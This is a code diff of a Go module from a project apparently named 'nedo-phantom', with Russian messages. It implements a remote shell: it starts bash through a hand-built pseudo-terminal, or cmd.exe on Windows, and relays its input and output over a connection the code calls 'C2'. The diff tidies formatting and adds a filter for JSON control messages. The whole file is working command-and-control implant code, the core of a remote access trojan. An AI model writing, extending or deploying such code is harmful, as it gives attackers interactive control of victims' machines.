@@ -5,10 +5,12 @@ import (
     "os"
     "os/exec"
     "runtime"
+    "strings"
     "syscall"
     "time"
     "unsafe"
-		"nedo-phantom/internal/common"
+
+    "nedo-phantom/internal/common"
 )
 
 type Shell struct {
@@ -31,45 +33,46 @@ func (s *Shell) Run() {
 func (s *Shell) runUnix() {
     cmd := exec.Command("/bin/bash")
     s.cmd = cmd
-    
+
     f, err := s.createPTY(cmd)
     if err != nil {
         fmt.Println("[-] Ошибка создания PTY:", err)
         return
     }
     defer f.Close()
-    
+
     err = cmd.Start()
     if err != nil {
         fmt.Println("[-] Ошибка запуска шелла:", err)
         return
     }
-    
+
     s.conn.SetReadDeadline(time.Time{})
-    
-		// Каналы для сигналов
-    errCh := make(chan error, 2)   // ошибки от горутин
-    doneCh := make(chan struct{})  // bash завершился
-		
-		// Горутина 1: C2 -> PTY (ввод команд)
+
+    errCh := make(chan error, 2)
+    doneCh := make(chan struct{})
+
     go func() {
         buf := make([]byte, 4096)
         for {
             n, err := s.conn.Read(buf)
             if n > 0 {
+                trimmed := strings.TrimSpace(string(buf[:n]))
+                if strings.HasPrefix(trimmed, "{") && strings.HasSuffix(trimmed, "}") {
+                    continue
+                }
                 if _, writeErr := f.Write(buf[:n]); writeErr != nil {
                     errCh <- fmt.Errorf("write PTY: %w", writeErr)
-										return
+                    return
                 }
             }
             if err != nil {
-								errCh <- fmt.Errorf("read C2: %w", err)
+                errCh <- fmt.Errorf("read C2: %w", err)
                 return
             }
         }
     }()
-    
-		// Горутина 2: PTY -> C2 (вывод команд)
+
     go func() {
         buf := make([]byte, 4096)
         for {
@@ -77,17 +80,16 @@ func (s *Shell) runUnix() {
             if n > 0 {
                 if _, writeErr := s.conn.Write(buf[:n]); writeErr != nil {
                     errCh <- fmt.Errorf("write C2: %w", writeErr)
-										return
+                    return
                 }
             }
             if err != nil {
-								errCh <- fmt.Errorf("read PTY: %w", err)
+                errCh <- fmt.Errorf("read PTY: %w", err)
                 return
             }
         }
     }()
-    
-    // Ждем завершения bash в отдельной горутине
+
     go func() {
         err := cmd.Wait()
         if err != nil {
@@ -98,18 +100,15 @@ func (s *Shell) runUnix() {
         close(doneCh)
     }()
 
-    // Ждем первое событие: ошибка в горутине или завершение bash
     select {
     case err := <-errCh:
         if err != nil {
             fmt.Printf("[*] Ошибка: %v\n", err)
         }
-        // Убиваем процесс, если он еще жив
         if s.cmd != nil && s.cmd.Process != nil {
             s.cmd.Process.Kill()
         }
     case <-doneCh:
-        // bash завершился сам
     }
 
     s.conn.SetReadDeadline(time.Now().Add(60 * time.Second))
@@ -118,7 +117,7 @@ func (s *Shell) runUnix() {
 func (s *Shell) runWindows() {
     cmd := exec.Command("cmd")
     s.cmd = cmd
-    
+
     stdin, err := cmd.StdinPipe()
     if err != nil {
         fmt.Println("[-] Ошибка создания stdin pipe:", err)
@@ -134,37 +133,39 @@ func (s *Shell) runWindows() {
         fmt.Println("[-] Ошибка создания stderr pipe:", err)
         return
     }
-    
+
     err = cmd.Start()
     if err != nil {
         fmt.Println("[-] Ошибка запуска шелла:", err)
         return
     }
-    
+
     s.conn.SetReadDeadline(time.Time{})
-    
-		errCh := make(chan error, 3) // 3 горутины
+
+    errCh := make(chan error, 3)
     doneCh := make(chan struct{})
 
-		// Горутина 1: C2 -> cmd (ввод)
     go func() {
         buf := make([]byte, 4096)
         for {
             n, err := s.conn.Read(buf)
             if n > 0 {
+                trimmed := strings.TrimSpace(string(buf[:n]))
+                if strings.HasPrefix(trimmed, "{") && strings.HasSuffix(trimmed, "}") {
+                    continue
+                }
                 if _, writeErr := stdin.Write(buf[:n]); writeErr != nil {
                     errCh <- fmt.Errorf("write stdin: %w", writeErr)
-										return
+                    return
                 }
             }
             if err != nil {
                 errCh <- fmt.Errorf("read C2: %w", err)
-								return
+                return
             }
         }
     }()
-    
-		// Горутина 2: cmd -> C2 (stdout)
+
     go func() {
         buf := make([]byte, 4096)
         for {
@@ -172,17 +173,16 @@ func (s *Shell) runWindows() {
             if n > 0 {
                 if _, writeErr := s.conn.Write(buf[:n]); writeErr != nil {
                     errCh <- fmt.Errorf("write C2 (stdout): %w", writeErr)
-										return
+                    return
                 }
             }
             if err != nil {
-								errCh <- fmt.Errorf("read stdout: %w", err)
+                errCh <- fmt.Errorf("read stdout: %w", err)
                 return
             }
         }
     }()
-    
-		// Горутина 3: cmd -> C2 (stderr)
+
     go func() {
         buf := make([]byte, 4096)
         for {
@@ -190,17 +190,16 @@ func (s *Shell) runWindows() {
             if n > 0 {
                 if _, writeErr := s.conn.Write(buf[:n]); writeErr != nil {
                     errCh <- fmt.Errorf("write C2 (stderr): %w", writeErr)
-										return
+                    return
                 }
             }
             if err != nil {
-								errCh <- fmt.Errorf("read stderr: %w", err)
+                errCh <- fmt.Errorf("read stderr: %w", err)
                 return
             }
         }
     }()
-    
-		// Ждем завершения cmd
+
     go func() {
         err := cmd.Wait()
         if err != nil {
@@ -220,10 +219,9 @@ func (s *Shell) runWindows() {
             s.cmd.Process.Kill()
         }
     case <-doneCh:
-        // cmd завершился сам
     }
-    
-		s.conn.SetReadDeadline(time.Now().Add(60 * time.Second))
+
+    s.conn.SetReadDeadline(time.Now().Add(60 * time.Second))
 }
 
 func (s *Shell) createPTY(cmd *exec.Cmd) (*os.File, error) {
@@ -231,7 +229,7 @@ func (s *Shell) createPTY(cmd *exec.Cmd) (*os.File, error) {
     if err != nil {
         return nil, fmt.Errorf("не удалось открыть /dev/ptmx: %v", err)
     }
-    
+
     var num int
     _, _, errno := syscall.Syscall(
         syscall.SYS_IOCTL,
@@ -243,7 +241,7 @@ func (s *Shell) createPTY(cmd *exec.Cmd) (*os.File, error) {
         f.Close()
         return nil, fmt.Errorf("ошибка TIOCGPTN: %v", errno)
     }
-    
+
     var unlock int = 0
     _, _, errno = syscall.Syscall(
         syscall.SYS_IOCTL,
@@ -255,38 +253,38 @@ func (s *Shell) createPTY(cmd *exec.Cmd) (*os.File, error) {
         f.Close()
         return nil, fmt.Errorf("ошибка разблокировки PTY: %v", errno)
     }
-    
+
     slaveName := fmt.Sprintf("/dev/pts/%d", num)
     slave, err := os.OpenFile(slaveName, os.O_RDWR, 0)
     if err != nil {
         f.Close()
         return nil, fmt.Errorf("не удалось открыть %s: %v", slaveName, err)
     }
-    
+
     err = s.setTerminalSize(slave.Fd(), 24, 80)
     if err != nil {
         f.Close()
         slave.Close()
         return nil, fmt.Errorf("ошибка установки размера: %v", err)
     }
-    
+
     err = s.setRawTerminal(slave.Fd())
     if err != nil {
         f.Close()
         slave.Close()
         return nil, fmt.Errorf("ошибка настройки терминала: %v", err)
     }
-    
+
     cmd.Stdin = slave
     cmd.Stdout = slave
     cmd.Stderr = slave
-    
+
     cmd.SysProcAttr = &syscall.SysProcAttr{
         Setsid:  true,
         Setctty: true,
         Ctty:    0,
     }
-    
+
     return f, nil
 }
 
@@ -325,12 +323,12 @@ func (s *Shell) setRawTerminal(fd uintptr) error {
     if errno != 0 {
         return fmt.Errorf("ошибка TCGETS: %v", errno)
     }
-    
+
     termios.Lflag &^= syscall.ICANON | syscall.ISIG
     termios.Lflag |= syscall.ECHO
     termios.Iflag &^= syscall.IXON
     termios.Cflag |= syscall.CS8
-    
+
     _, _, errno = syscall.Syscall(
         syscall.SYS_IOCTL,
         fd,
